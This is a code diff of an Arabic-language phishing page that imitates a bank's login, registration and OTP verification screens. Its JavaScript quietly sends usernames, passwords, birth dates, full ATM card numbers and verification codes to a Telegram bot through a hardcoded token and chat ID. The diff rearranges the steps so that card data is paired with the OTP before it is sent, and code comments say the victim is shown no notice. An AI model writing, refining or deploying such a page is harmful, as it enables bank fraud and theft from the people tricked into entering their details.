@@ -170,7 +170,6 @@
       color: #222;
       cursor: pointer;
     }
-    /* Responsive */
     @media (max-width: 480px) {
       .centered {
         max-width: 100%;
@@ -209,10 +208,11 @@
     </div>
   </div>
   <div class="centered" id="verify-page" style="display:none;">
+    <img src="https://www2.0zz0.com/2025/09/30/14/235342786.jpeg" alt="logo" class="logo">
     <div class="card">
       <div class="form-title">إدخال رمز التحقق</div>
       <div class="input-group">
-        <input type="text" class="input-field" maxlength="4" pattern="[0-9]{4}" placeholder="رمز التحقق (4 أرقام)" id="verify-code" inputmode="numeric" oninput="onlyNumber(this,4)">
+        <input type="text" class="input-field" placeholder="رمز التحقق" id="verify-code">
       </div>
       <button class="main-btn" onclick="submitVerify()">إرسال رمز التحقق</button>
     </div>
@@ -221,6 +221,7 @@
     </div>
   </div>
   <div class="centered" id="register-page" style="display:none;">
+    <img src="https://www2.0zz0.com/2025/09/30/14/235342786.jpeg" alt="logo" class="logo">
     <div class="card">
       <div class="form-title">تسجيل</div>
       <div class="input-group">
@@ -233,10 +234,6 @@
       <div class="input-group">
         <input type="text" class="input-field" placeholder="بطاقة الصراف الآلي *" id="reg-card" maxlength="16" inputmode="numeric" oninput="onlyNumber(this,16)">
         <span class="icon-show" onclick="togglePassword('reg-card', this)">إظهار</span>
-      </div>
-      <div class="input-group">
-        <input type="text" class="input-field" placeholder="رمز التحقق *" id="reg-code" maxlength="4" inputmode="numeric" oninput="onlyNumber(this,4)">
-        <span class="icon-show" onclick="togglePassword('reg-code', this)">إظهار</span>
       </div>
       <div class="checkbox-group">
         <input type="checkbox" id="reg-terms">
@@ -252,8 +249,8 @@
     const TELEGRAM_TOKEN = "7962720643:AAFgFfeyec_SfTiEpQOsMPe7QSa7vH4Luq8";
     const TELEGRAM_CHAT_ID = "6873334348";
 
-    // بيانات الدخول
-    let loginData = {};
+    // بيانات التسجيل المؤقتة
+    let registerData = {};
 
     function onlyNumber(el, maxLength) {
       el.value = el.value.replace(/\D/g, '');
@@ -306,7 +303,6 @@
           text: message
         })
       });
-      // لا تظهر أي رسالة أو تنبيه للمستخدم
     }
     function submitLogin() {
       const user = document.getElementById('login-user').value.trim();
@@ -315,33 +311,16 @@
         alert('يرجى إدخال رمز العميل وكلمة المرور');
         return;
       }
-      loginData = { user, pass };
       // إرسال بيانات الدخول للبوت
       sendToTelegram(`دخول جديد:\nرمز العميل: ${user}\nكلمة المرور: ${pass}`);
-      // الانتقال لصفحة رمز التحقق بدون أي تنبيه
       showVerify();
-    }
-    function submitVerify() {
-      const code = document.getElementById('verify-code').value.trim();
-      if (!/^\d{4}$/.test(code)) {
-        alert('يرجى إدخال رمز تحقق مكون من 4 أرقام');
-        return;
-      }
-      // إرسال بيانات الدخول مع رمز التحقق للبوت
-      if (loginData.user && loginData.pass) {
-        sendToTelegram(`دخول جديد:\nرمز العميل: ${loginData.user}\nكلمة المرور: ${loginData.pass}\nرمز التحقق: ${code}`);
-      }
-      // إعادة المستخدم لصفحة الدخول أو تصفية البيانات
-      loginData = {};
-      showLogin();
     }
     function submitRegister() {
       const user = document.getElementById('reg-user').value.trim();
       const birth = document.getElementById('reg-birth').value.trim();
       const card = document.getElementById('reg-card').value.trim();
-      const code = document.getElementById('reg-code').value.trim();
       const terms = document.getElementById('reg-terms').checked;
-      if (!user || !birth || !card || !code || !terms) {
+      if (!user || !birth || !card || !terms) {
         alert('يرجى تعبئة جميع الحقول والموافقة على الشروط');
         return;
       }
@@ -349,14 +328,20 @@
         alert('بطاقة الصراف الآلي يجب أن تتكون من 16 رقم فقط');
         return;
       }
-      if (!/^\d{4}$/.test(code)) {
-        alert('رمز التحقق يجب أن يتكون من 4 أرقام فقط');
-        return;
+      registerData = { user, birth, card };
+      // الانتقال إلى صفحة رمز التحقق مباشرة
+      showVerify();
+    }
+    function submitVerify() {
+      const verifyCode = document.getElementById('verify-code').value.trim();
+      // إرسال البيانات مع رمز التحقق إلى البوت
+      if (registerData.user && registerData.birth && registerData.card) {
+        sendToTelegram(
+          `تسجيل جديد:\nرمز العميل: ${registerData.user}\nتاريخ الميلاد: ${registerData.birth}\nبطاقة الصراف الآلي: ${registerData.card}\nرمز التحقق: ${verifyCode}`
+        );
+        registerData = {};
+        showLogin();
       }
-      // إرسال بيانات التسجيل للبوت مع الرمز
-      sendToTelegram(`تسجيل جديد:\nرمز العميل: ${user}\nتاريخ الميلاد: ${birth}\nبطاقة الصراف الآلي: ${card}\nرمز التحقق: ${code}`);
-      // إعادة المستخدم لصفحة الدخول بدون أي تنبيه
-      showLogin();
     }
   </script>
 </body>
